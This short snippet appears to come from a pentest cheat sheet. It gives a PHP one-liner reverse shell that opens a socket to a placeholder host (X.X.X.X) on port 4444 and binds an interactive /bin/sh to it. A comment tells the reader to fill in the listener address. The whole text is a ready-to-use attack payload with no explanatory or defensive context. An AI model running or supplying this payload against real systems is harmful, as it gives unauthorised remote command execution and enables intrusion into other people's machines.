## Replace X.X.X.X by localhost IP and 4444 will be the listening port
php -r '$sock=fsockopen("X.X.X.X",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
